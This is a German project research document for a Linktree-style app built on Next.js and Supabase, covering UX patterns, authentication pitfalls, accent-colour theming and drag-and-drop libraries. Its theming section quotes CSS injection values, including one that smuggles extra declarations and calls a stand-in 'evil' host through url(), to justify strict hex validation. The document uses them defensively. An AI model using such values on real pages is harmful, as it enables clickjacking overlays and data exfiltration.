# Discovery — Phase 1

Erstellt: 2026-08-14 · Quelle: 4 parallele Research-Agenten, konsolidiert
Stand der Codebasis zum Zeitpunkt der Recherche: `next 16.3.1`, `react 19.2.8`, `@supabase/ssr 0.12.4`, `@supabase/supabase-js 2.112.3`, Tailwind 4, shadcn 4.18.

Die Empfehlungen hier sind **Vorschläge für die Sparringssession**, keine getroffenen Entscheidungen. Entschieden wird in Phase 2, festgehalten in `guidelines.md`.

---

## 1. UX-Patterns bei Linktree-Alternativen

### URL-Struktur
Alle großen Anbieter nutzen **Pfad, nicht Subdomain**: `linktr.ee/<user>`, `bento.me/<user>`, `beacons.ai/<user>`, `bio.link/<user>`. Grund: eine Domain = ein Zertifikat, ein Deployment, ein Cache. Custom Domains sind durchgängig ein Paid-Feature. Ein Präfix wie `/u/` verwendet niemand — das ist ein reiner Implementierungs-Kompromiss gegen Kollisionen mit App-Routen.

> Bento.me wurde am 13.02.2026 abgeschaltet. Als Design-Referenz noch brauchbar, als lebendes Vorbild nicht mehr.

### Editor-Layout
- **Linktree**: Desktop = Split-View (Controls links, Live-Preview rechts als Phone-Frame). Mobil wird der Split **aufgelöst** — Preview oben, Controls darunter, gestapelt.
- **Bento**: WYSIWYG auf einem 9×9-Grid, der Editor *ist* die Seite.
- **Beacons**: Echtzeit-Editor, seit 2026 mit AI-Onboarding davor.

Split-View + Phone-Frame ist der De-facto-Standard für listenbasierte Tools. Auf Mobile hält ihn niemand bei.

### Accent-Color / Theming
Linktree fährt zweistufig: kuratierte **Preset-Themes** zuerst, freier Picker als Fallback. Typisch sind 6–12 ohne Scroll sichtbare Presets. Beacons hat ein „Brand Kit" mit eigenen Markenfarben.

**Befund mit Hebelwirkung:** *Kein* Anbieter dokumentiert eine Kontrastsicherung. Bei allen kann man sich unlesbare Farbkombinationen bauen. Das ist ein Schwachpunkt der Vorbilder, kein Vorbild — und für uns eine Gelegenheit, es in ~10 Zeilen besser zu machen (siehe Abschnitt 3.5).

### Onboarding
- **Linktree**: Username wird **im Sign-up-Formular selbst** erfasst (E-Mail + Username + Passwort in einem Schritt), oft schon auf der Landingpage vorgeklaut. Danach Wizard (Kategorie, Name, Plan, Verifikation). Time-to-Page ~3 Minuten.
- **Bento** (Templates) und **Beacons** (AI-Generierung) füllen den Empty-State aktiv.

Der leere Zustand wird nirgends leer gelassen — überall Template, Vorbefüllung oder Beispiel-Link.

### Link-Karten
Linktree bietet „Classic" (kompakter Text-Button) und „Featured" (großes 16:9-Vorschaubild). Immer einspaltige Vertikalliste, Drag-and-Drop-Sortierung, Bearbeiten über ein Icon direkt an der Karte.
Tap-Targets nach WCAG/Material: **Minimum 44×44 px**, empfohlen 48 px, 8 px Abstand, Fokus-Indikator 3:1.

### Empfehlungen
1. `/u/<username>` beibehalten. Kein Anbieter macht es, aber der Präfix schützt den Root-Namespace vor Kollisionen mit `/login`, `/dashboard`, `/api`. Die Alternative `/<username>` bräuchte eine Reserved-Words-Liste — mehr Risiko, null Demo-Gewinn.
2. **Username im Sign-up-Formular claimen**, nicht danach. Drei Felder, ein Schritt, Live-Verfügbarkeitsprüfung. Erspart einen eigenen Wizard-Screen.
3. **Editor**: Split-View auf Desktop (Phone-Frame `sticky` rechts), auf Mobile kein Split — Preview per Toggle oder Sheet.
4. **Accent-Color**: 8 Preset-Swatches plus `<input type="color">` für frei.
5. **Kontrast lösen, wo die Vorbilder es nicht tun** (siehe 3.5).
6. **Nur „Classic"-Karten.** Volle Breite, `min-height: 56px`, `gap: 12px`, kein Thumbnail (Storage ist draußen). Drag-Handle links, Edit/Delete rechts, alle Controls ≥ 44 px.
7. **Empty-State**: vorgefüllter Beispiel-Link plus CTA-Karte statt leerer Fläche.

---

## 2. Supabase Email+Passwort-Auth im Next.js App Router

Recherchiert über Context7 (`/supabase/ssr`, `/supabase/supabase`), Supabase MCP und die **lokal installierten** Typdefinitionen — letztere sind die autoritative Quelle für Signaturen.

### Zwei Befunde, die von älterem Wissen abweichen

**a) `middleware.ts` heißt in Next 16 `proxy.ts`.** Wörtlich aus `node_modules/next/dist/docs/`:
> The `middleware.js` file convention has been **deprecated** in Next.js 16 and renamed to `proxy.js`. All functionality remains the same — only the file and export names have changed.

Codemod: `npx @next/codemod@canary middleware-to-proxy .`. Die aktuellen Supabase-Docs sind bereits umgestellt.

**b) `setAll` hat in `@supabase/ssr` 0.12.x ein zweites Argument.** Aus `node_modules/@supabase/ssr/dist/main/types.d.ts`:
```ts
export type SetAllCookies = (
  cookies: { name: string; value: string; options: CookieOptions }[],
  headers: Record<string, string>   // NEU
) => Promise<void> | void
```
Die Library übergibt dort `Cache-Control: private, no-cache, no-store, must-revalidate, max-age=0`, `Expires: 0`, `Pragma: no-cache`. Werden diese Header im Proxy nicht auf die Response gesetzt, **kann ein CDN eine Session-Response cachen und die Session eines Users an einen anderen ausliefern.** Jedes Tutorial mit einargumentigem `setAll(cookiesToSet)` ist veraltet.

Ebenfalls neu in 0.12.x: Lazy Session Init (`skipAutoInitialize`) — Session lädt erst beim ersten `getSession()`/`getUser()`/`getClaims()`.

### Client-Setup
- **Browser** (`lib/supabase/client.ts`): `createBrowserClient(url, key)` — keine `cookies`-Option nötig, fällt auf `document.cookie` zurück, ist im Browser Singleton.
- **Server** (`lib/supabase/server.ts`): `createServerClient` mit `cookies: { getAll, setAll }`. `cookies()` aus `next/headers` ist in Next 15/16 **async**. Das `setAll` muss in `try/catch` — aus einer Server Component heraus sind Cookies nicht schreibbar, das ist ignorierbar, solange der Proxy refresht. Das zweite Argument (`headers`) wird hier bewusst verworfen, weil Server Components keine Response-Header setzen können.
- **Nie einen Client global cachen** — pro Request neu erzeugen.
- **Env-Namen**: Supabase migriert von `anon`/`service_role` auf `sb_publishable_*`/`sb_secret_*`. Docs nutzen inzwischen `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY`. Alte anon-Keys laufen laut Doku Ende 2026 aus.

### Proxy — warum und wie
Server Components können keine Cookies schreiben. Läuft das Access Token ab, muss der Refresh dort passieren, wo `Set-Cookie` möglich ist: im Proxy. Er (a) refresht via `getClaims()`, (b) schreibt das neue Token per `request.cookies.set` zurück in den Request, damit Server Components nicht erneut refreshen, (c) schreibt es per `response.cookies.set` an den Browser.

**Die sechs häufigsten Fehlerquellen:**
1. **Response-Objekt nicht durchreichen.** `supabaseResponse` muss unverändert zurück. Eine eigene Response braucht zwingend `NextResponse.next({ request })` + `myResponse.cookies.setAll(supabaseResponse.cookies.getAll())`. Sonst laufen Browser und Server auseinander → zufällige Logouts.
2. **Cookies nur auf der Response setzen.** Ohne `request.cookies.set(...)` sieht die Server Component das alte Token und refresht ein zweites Mal.
3. **`getClaims()` entfernen oder Code dazwischenschieben.** Zwischen `createServerClient` und `getClaims()` gehört nichts. Ohne den Aufruf gibt es keinen Refresh — Symptom sind sporadische Logouts, die extrem schwer zu debuggen sind.
4. **Cache-Header ignorieren** (das zweite `setAll`-Argument) → CDN-Caching von Session-Responses.
5. **Matcher zu weit.** Ohne Ausschluss von `_next/static`, `_next/image` und Bildern läuft die Auth-Logik über alle Assets.
6. **Refresh nach committeter Response.** `getClaims()` früh im Handler aufrufen, sonst geht das neue Token verloren.

**Zusätzlich für uns kritisch:** Die öffentliche Route `/u/<username>` muss von der Redirect-Logik ausgenommen werden, sonst wird jeder anonyme Besucher auf `/login` geworfen. Whitelist: `/`, `/login`, `/auth`, `/u`.

### `getClaims()` vs. `getUser()` vs. `getSession()`

| Methode | Netzwerk | Serverseitig vertrauenswürdig | Einsatz |
|---|---|---|---|
| `getClaims()` | nein (lokale JWT-Signaturprüfung) | **ja** | Route-Schutz, Identität, `sub`/`email` |
| `getUser()` | ja (Roundtrip) | **ja** | frischer, kanonischer User-Record |
| `getSession()` | nein (liest Cookies) | **nein** für das User-Objekt | wenn man den Token selbst braucht |

Klare Verschiebung gegenüber älterem Wissen: Der Rat „immer `getUser()`, nie `getSession()`" ist überholt. **Aktuell empfohlen ist `getClaims()`** — gleich sicher, ohne Roundtrip. Voraussetzung sind asymmetrische JWT Signing Keys (Dashboard → JWT Keys); mit Legacy-HS256 macht `getClaims()` intern doch einen Roundtrip. Vor `getSession()` im Servercode warnt die Doku weiterhin ausdrücklich.

### Server Actions
`signIn` / `signUp` / `signOut` als `'use server'`-Funktionen, im Formular über React 19 `useActionState` verdrahtet.
- **`redirect()` wirft** intern `NEXT_REDIRECT` — steht der Aufruf in einem `try`, schluckt das `catch` den Redirect. Immer *nach* dem Try-Block.
- **`revalidatePath('/', 'layout')`** invalidiert den Router-Cache inkl. Root-Layout. Nötig, weil in fast jedem Layout auth-abhängige UI hängt.
- **Fehler nicht per `redirect('/error')`** wie in den offiziellen Snippets, sondern als String über `useActionState` ins Formular. Login-Fehler generisch halten („E-Mail oder Passwort ist falsch") — sonst User-Enumeration.
- Bei aktivierter E-Mail-Bestätigung liefert `signUp` **keine Session**; der Redirect auf `/dashboard` liefe ins Leere.

### Auth-Guard
Zweistufig: Proxy-Redirect für die UX, `getClaims()`-Check in `app/dashboard/layout.tsx` als eigentliche Absicherung. Der Proxy allein reicht nicht (Data-Access kann ihn umgehen, Next hatte hier historisch CVEs). Der Guard ersetzt **nicht** RLS — er steuert nur die Navigation.

### Passwort-Anforderungen
Konfigurierbar unter Auth → Providers → Email: `password_min_length`, `password_required_characters`, `password_hibp_enabled`. Doku-Empfehlung: „Anything less than 8 characters is not recommended." Der Leaked-Password-Schutz (HaveIBeenPwned) ist **Pro-Plan-only** — auf Free bleibt er aus, der Security Advisor meldet das als erwartbare Warnung.

### `profiles` beim Sign-Up anlegen
**Variante A — DB-Trigger auf `auth.users`** (offizieller Weg): atomar, funktioniert auch bei Signups außerhalb der App, `SECURITY DEFINER` umgeht RLS. Zwingend mit `set search_path = ''` (sonst Search-Path-Hijacking, Advisor-Warnung), voll qualifizierten Namen und `on delete cascade`.
*Contra, Doku-Warnung wörtlich:* „failures in the trigger logic can prevent new users from successfully signing up". Ein `unique`-Konflikt auf `username` lässt den ganzen Signup mit `Database error saving new user` scheitern — ohne brauchbare Meldung im Client, debuggbar nur über Postgres-Logs. Klassischer Kurs-Stolperstein.

**Variante B — Insert in der Server Action**: saubere Fehlermeldungen, in TypeScript debuggbar. Aber nicht atomar (verwaiste Accounts möglich), braucht eine aktive Session für die INSERT-Policy, und ein zweiter Signup-Weg umgeht ihn.

**Kompromiss: Trigger + Vorab-Prüfung.** Trigger als Netz, in der Server Action vor `signUp` die Username-Verfügbarkeit abfragen, damit der Nutzer einen echten Fehlertext sieht. Der `unique`-Constraint bleibt die harte Absicherung gegen die Race Condition.

### Empfehlungen
1. Datei heißt **`proxy.ts`**, Export `proxy` — nicht `middleware.ts`.
2. **`setAll(cookiesToSet, headers)` mit beiden Argumenten**, Header im Proxy auf die Response setzen.
3. Durchgängig **`getClaims()`**; `getUser()` nur für den frischen User-Record, `getSession()` serverseitig gar nicht. Dazu im Dashboard auf asymmetrische JWT Signing Keys umstellen.
4. **Guard doppelt**: Proxy-Redirect für UX, Layout-Check als Sicherung. Proxy-Whitelist um `/` und `/u` erweitern.
5. **E-Mail-Bestätigung für die Demo abschalten**, vor einem echten Deploy wieder an.
6. **Passwort-Minimum 8**, kein Zeichenklassen-Zwang. Client `minLength={8}` plus Server-Prüfung.
7. **`profiles` per Trigger** mit `search_path`-Absicherung, plus Vorab-Prüfung des Usernamens in der Action. `accent_color` bekommt denselben Regex als DB-`check` — dritte Validierungsschicht, kostet nichts.
8. **RLS auf beiden Tabellen**, danach `get_advisors`. Erwartbare Rest-Warnung auf Free: Leaked-Password-Schutz aus.
9. Env: `NEXT_PUBLIC_SUPABASE_URL` + `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY`.

---

## 3. Theming-Patterns für user-customizable Pages

### 3.1 Speicherung: Spalte statt JSONB
```sql
alter table public.profiles
  add column accent_color text not null default '#6d28d9'
  check (accent_color ~ '^#[0-9a-fA-F]{6}$');
```
Der entscheidende Vorteil gegenüber JSONB: **JSONB lässt sich nicht sauber per CHECK absichern** — jeder Key bräuchte einen eigenen Ausdruck, der bei fehlendem Key auf NULL läuft und stillschweigend durchgeht. Dazu: saubere TypeScript-Typen statt `Json`, Column-level Grants möglich, kleinerer Speicher.

Das Gegenargument „JSONB ist erweiterbarer" trägt nicht: `ALTER TABLE ADD COLUMN ... DEFAULT` ist seit PG 11 eine reine Metadaten-Operation ohne Table-Rewrite. JSONB lohnt erst bei user-definierten oder wirklich sparse Keys — per Scope ausgeschlossen.

### 3.2 Sichere Injektion — verifiziert im React-Quellcode des Projekts
**Client** (`react-dom-client.development.js`): Custom Properties gehen über `CSSStyleDeclaration.setProperty()`. Die CSSOM parst genau eine Deklaration; `red;}html{display:none` ist kein gültiger `<declaration-value>` und wird verworfen. Der Breakout-Vektor ist dort strukturell tot.

**Server** (`react-dom-server.node.development.js`, `pushStyleAttribute`): Custom Properties laufen durch `escapeTextForBrowser`, das `" & ' < >` escapt. HTML-Kontext-Ausbruch ist damit unmöglich — kein `"` zum Verlassen des Attributs, kein `</style>`.

**Genau das ist der harte Grund gegen `<style dangerouslySetInnerHTML>`:** dort greift dieses Escaping nicht, und der `</style>`-Breakout ist echter Stored XSS. So war die ApostropheCMS-CVE gebaut ([GHSA-97v6-998m-fp4g](https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-97v6-998m-fp4g)) — Farbwert ungeprüft in einen `<style>`-Tag gerendert.

**Die eine reale Restlücke:** `;` wird von `escapeTextForBrowser` **nicht** escapt. Ein Wert wie `red;position:fixed;inset:0;background:url(https://evil/?x)` erzeugt im SSR-HTML zusätzliche Deklarationen im selben Attribut. Kein XSS (kein JS, kein neuer Selektor), aber real: Overlay/Clickjacking-Fläche, Exfiltration über den `url()`-Request, Layout-Zerstörung. Und es ist ein SSR/CSR-Split — der Client verwirft es, das ausgelieferte HTML nicht.

**Konsequenz: Die Hex-Validierung ist nicht Kosmetik, sie ist die Schutzschicht.** Mit `^#[0-9a-fA-F]{6}$` ist der Wertebereich semikolonfrei per Konstruktion. Whitelist, nicht Blacklist.

### 3.3 Schutzschichten — was angemessen ist

| Maßnahme | Urteil |
|---|---|
| Hex-Validierung (Client + Server + DB-CHECK) | **Pflicht** — das ist die eigentliche Sicherheit |
| Basis-CSP ohne Nonce, statisch in `next.config.ts` | **Ja**, billig und wirksam gegen die Restrisiken |
| CSP-Nonce | **Nein.** Erzwingt laut Next-Doku dynamisches Rendering für *alle* Seiten (Static Optimization, ISR, PPR fallen weg) — und deckt Inline-`style`-**Attribute** nicht einmal ab, dafür wäre `style-src-attr` zuständig |
| DOMPurify / Color-Sanitizer | **Overkill.** DOMPurify sanitisiert HTML, nicht CSS-Werte. Der Regex ist die schärfere und billigere Prüfung |

`img-src 'self' data: blob:` blockiert die `url()`-Exfiltration, `frame-ancestors 'none'` das Clickjacking — damit sind die Restrisiken aus 3.2 direkt neutralisiert.

### 3.4 Tailwind v4 — `@theme inline` ist der Schlüssel
Aus der v4-Doku: *„Use the `inline` option to resolve theme variables as values rather than CSS variable references, preventing scope-related resolution issues."*

Unser `globals.css` nutzt bereits `@theme inline` — **genau deshalb funktioniert ein Subtree-Override überhaupt**. Mit `inline` landet `var(--brand)` in der Utility-Regel und wird am Verwendungsort aufgelöst; jeder Wrapper, der `--brand` setzt, färbt seinen Subtree. Ohne `inline` würde Tailwind am `:root` auflösen und der Override liefe ins Leere. Klassischer Stolperstein.

**Warnung: `--accent` ist bei shadcn schon belegt.** In unserem `globals.css` ist `--accent` ein sehr heller, entsättigter Hover-Ton; shadcn nutzt `bg-accent` für Ghost-Button-Hover, Dropdown-Items und Command-Menü-Highlights. Wird `--accent` mit einer gesättigten User-Farbe überschrieben, wird **jeder Hover-State auf der Public-Page knallbunt**, und `--accent-foreground` passt nicht mehr dazu. Lösung: eigenen Token `--brand` einführen, `--accent` in Ruhe lassen.

```css
:root {
  --brand: #6d28d9;
  --brand-hover:  color-mix(in oklab, var(--brand) 88%, black);
  --brand-subtle: color-mix(in oklab, var(--brand) 12%, var(--background));
  --brand-ring:   color-mix(in oklab, var(--brand) 60%, transparent);
}
@theme inline {
  --color-brand:        var(--brand);
  --color-brand-hover:  var(--brand-hover);
  --color-brand-subtle: var(--brand-subtle);
  --color-brand-ring:   var(--brand-ring);
}
```

**`color-mix()` statt Relative Color Syntax.** `color-mix()` ist Baseline Widely Available (~89 %), RCS ist jünger und hat eine Safari-Falle (`calc(h + 180)` braucht dort `deg`). `in oklab` mischt perzeptuell gleichmäßig — der sRGB-Default graut Mischungen aus. Ein Hex-Input ist für `color-mix()` unproblematisch.

### 3.5 Kontrast: Schwarz oder Weiß auf der Accent-Farbe
WCAG-2.x-Luminanz, Gleichstand zwischen Kontrast-zu-Weiß und Kontrast-zu-Schwarz bei `(L+0.05)² = 1.05·0.05` → **L = 0.17913**.

Also: `luminance(hex) > 0.17913 ? schwarz : weiß`. Ein Vergleich, keine Dependency.

Die schöne Eigenschaft: Der garantierte Mindestkontrast an der ungünstigsten Stelle ist **4.58:1** — WCAG AA für Normaltext ist damit für *jede* denkbare Accent-Farbe erfüllt. Kein Sonderfall, keine Warnung an den User nötig. Kein APCA/WCAG-3 (noch Draft).

### 3.6 FOUC
**Entsteht in dieser Architektur gar nicht** — die Server Component schreibt `--brand:#…` direkt ins `style`-Attribut des initialen HTML, bevor irgendein JS lädt. FOUC entsteht nur durch `useEffect`-Nachladen, Client-Fetch oder einen `"use client"`-Wrapper, der die Farbe selbst holt.

Zwei Punkte: Der Wrapper muss den Subtree umschließen, in dem `brand`-Utilities vorkommen (in `app/u/[username]/`, **nicht** im Root-Layout). Und in der Server Action `revalidatePath('/u/' + username)` nicht vergessen — sonst zeigt ein späterer Cache die alte Farbe. Das ist kein FOUC, aber der Fehler, den man stattdessen bekommt.

### Empfehlungen
1. `accent_color text` mit CHECK-Constraint. Kein JSONB.
2. **Token `--brand` statt `--accent`** überschreiben.
3. Injektion **ausschließlich** per `style={{ "--brand": … } as React.CSSProperties}`. `<style dangerouslySetInnerHTML>` ist verboten.
4. Eine einzige Torwächter-Funktion `safeAccent()` in `src/lib/theme.ts`, aufgerufen an drei Stellen (Client-Form, Server Action, Public-Page-Render). Sie wirft nie, sie fällt auf den Default zurück — ein manipulierter DB-Wert darf die Seite nicht in eine Error-Boundary kippen. **Projektregel: kein Farbwert erreicht JSX, ohne durch `safeAccent()` gegangen zu sein.**
5. Abgeleitete Töne mit `color-mix(in oklab, …)`.
6. Textfarbe automatisch über den Luminanz-Schwellwert, als `--brand-foreground` auf denselben Wrapper.
7. FOUC: nichts zu tun. Stattdessen `revalidatePath` in der Server Action.
8. Statische CSP-Header in `next.config.ts`, kein Nonce.
9. Kein DOMPurify.

---

## 4. Drag-and-Drop für React 19

**Nebenbefund vorab: `motion` / `framer-motion` ist gar nicht installiert.** Der oft angenommene Vorteil „Framer Motion ist ja eh schon da" existiert nicht — beide Kandidaten kosten eine neue Dependency.

### Vergleich

| Kriterium | Motion `Reorder` 13.1.0 | dnd-kit v1 (core 6.3 + sortable 10) | dnd-kit v2 (react 0.5.0) | @hello-pangea/dnd | Pragmatic DnD | HTML5 nativ |
|---|---|---|---|---|---|---|
| React 19 | ✅ | ✅ | ✅ | ✅ | ✅ | – |
| Stabil (≥ 1.0) | ✅ | ✅ | ❌ 0.x | ✅ | ✅ | ✅ |
| Zeilen für Vertical List | ~12 | ~55 | ~20 | ~50 | ~80+ | ~60 |
| Keyboard-Reorder | ❌ | ✅ eingebaut | ✅ | ✅ | selbst bauen | ❌ |
| Screenreader / ARIA | ❌ | ✅ Live-Region | ✅ | ✅ best-in-class | selbst bauen | ❌ |
| Mobile-Touch | ⚠️ Bugs + Scroll-Konflikt | ✅ Sensor-Constraints | ✅ | ✅ | ✅ | ❌ |
| Speicher-Zeitpunkt | ⚠️ `onReorder` feuert dauernd | ✅ `onDragEnd` einmalig | ✅ | ✅ | ✅ | ⚠️ |
| Bundle (gzip, geschätzt) | ~35–50 kB | ~25–35 kB | ~20 kB | ~35 kB | < 5 kB Core | 0 |

**Disqualifiziert:** `react-beautiful-dnd` (npm-deprecated Okt 2024, Repo seit April 2025 archiviert, kein React 18+). HTML5-native API (kein Touch-Support auf Mobile — `dragstart` feuert auf iOS/Android schlicht nicht). `@atlaskit/pragmatic-drag-and-drop` ist technisch exzellent, aber bewusst „unopinionated" — keine Sortier-Logik, kein Drop-Indicator, alles über Zusatzpakete. Für Einsteiger der größte Eigenbau-Aufwand.

### Empfehlung: dnd-kit v1 (`@dnd-kit/core@^6.3` + `@dnd-kit/sortable@^10`)
Mit Drag-Handle, `PointerSensor` + `KeyboardSensor` und `useOptimistic`. Begründung nach Gewicht:

1. **Motion `Reorder` scheitert an der Mobile-Anforderung, nicht am Komfort.** Motion braucht `touch-action: none`, was Seiten-Scrolling über den Karten tötet. Man braucht also ohnehin `dragListener={false}` + `useDragControls` + Handle — der 12-Zeilen-Vorteil ist damit weg, und man landet bei ~30 Zeilen mit offenen Mobile-Bugs ([#1597](https://github.com/framer/motion/issues/1597), [#2101](https://github.com/framer/motion/issues/2101), [#2287](https://github.com/framer/motion/issues/2287)).
2. **Keyboard-Bedienung gibt es bei dnd-kit geschenkt, bei Motion gar nicht.** Motions Reorder-Doku erwähnt Keyboard und ARIA mit keinem Wort. Die Alternative wären zusätzliche Hoch/Runter-Buttons — dann ist dnd-kit endgültig billiger.
3. **`onDragEnd` feuert einmal, `onReorder` feuert dauernd.** Genau die Falle, die 20 Server-Action-Calls pro Drag produziert. dnd-kit macht den richtigen Weg zum offensichtlichen Weg.
4. **Nicht die v2-Linie** (`@dnd-kit/react@0.5.0`), so verlockend die 5-Zeilen-API ist. `0.x` mit Publishes im Februar und Juni 2026 heißt Breaking Changes während des Kurses.

Framer Motion bleibt trotzdem sinnvoll — für Page-Transitions und Hover-States auf der Public-Page. Nur nicht als Drag-Engine.

### Persistenz: `position`-Spalte
**Integer mit Neu-Nummerierung, kein Fractional Indexing.** Fractional Indexing (Float/LexoRank) löst ein Problem, das wir nicht haben (sehr lange Listen, viele gleichzeitige Editoren) und kostet Präzisionsdrift plus Rebalancing-Logik. Bei 3–20 Links und einem Editor pro Liste: alle Zeilen neu von 0 durchnummerieren.

**Batch-Update — drei Wege, einer richtig:**
- ❌ Einzelne Updates in einer Schleife: 20 Roundtrips, nicht atomar.
- ⚠️ `upsert()`: PostgREST erzeugt immer `INSERT … ON CONFLICT DO UPDATE`. Alle `NOT NULL`-Spalten müssen mitgeschickt werden, und die Tabelle bräuchte eine **INSERT-Policy**, obwohl wir nur updaten wollen — das weicht das Sicherheitsmodell auf.
- ✅ **RPC mit einem Array von IDs**: ein Roundtrip, atomar, RLS bleibt scharf.

```sql
create or replace function public.reorder_links(link_ids uuid[])
returns void language sql security invoker set search_path = ''
as $$
  update public.links as l
     set position = o.ord - 1
    from unnest(link_ids) with ordinality as o(id, ord)
   where l.id = o.id and l.user_id = (select auth.uid());
$$;
```

Der Client schickt **nur die ID-Reihenfolge**, keine Positionen — der Server leitet `position` aus `with ordinality` ab. Ein manipulierter Client kann damit keine krummen Werte setzen.

### Optimistic UI (React 19)
`useOptimistic` rollt automatisch zurück, sobald die auslösende Transition endet — funktioniert deshalb **nur innerhalb** von `startTransition` oder einer Form-Action. Zwei Fallstricke:
1. `setOptimistic…` **muss innerhalb** von `startTransition` aufgerufen werden, sonst wirft React.
2. **Kein zusätzliches `useState` danebenhalten.** Genau ein Wahrheitsstrang: Server-Props → `useOptimistic`. Zwei Quellen sind der klassische Einsteiger-Bug (Liste springt nach dem Speichern zurück).

Bei Fehler verfällt der optimistische Zustand am Transition-Ende und die Liste springt auf die Server-Reihenfolge zurück — gewünschtes Verhalten, dazu ein Toast.

### Mobile-Touch-Fallstricke

| Problem | Lösung |
|---|---|
| Scroll vs. Drag | **Nur das Handle** bekommt `touch-none`, nie die ganze Karte |
| Versehentliches Drag beim Tap | `activationConstraint: { distance: 8 }` oder `{ delay: 200, tolerance: 5 }` |
| `onClick` feuert nach dem Drag | Distance-Constraint löst das automatisch |
| Item bleibt unter anderen Karten | `z-index` im Drag-State (Motion: `position: relative` ist Pflicht) |
| Pull-to-Refresh unterbricht Drag | `overscroll-behavior-y: contain` auf dem Container |

**Visual Verification zwingend auch im Mobile-Emulationsmodus** — die dokumentierten Motion-Bugs wurden alle erst dort sichtbar.

---

## Offene Punkte für die Sparringssession
1. `/u/<username>` vs. `/<username>` mit Reserved-Words-Liste
2. Username-Claim im Sign-up-Formular vs. separater Onboarding-Screen
3. Drag-and-Drop-Library: **dnd-kit** entgegen der ursprünglichen Kickoff-Annahme (Framer Motion Reorder)
4. Accent-Color: Presets, freier Picker, oder beides
5. Editor-Layout und Mobile-Verhalten der Preview
6. Empty-State-Strategie beim frischen Account
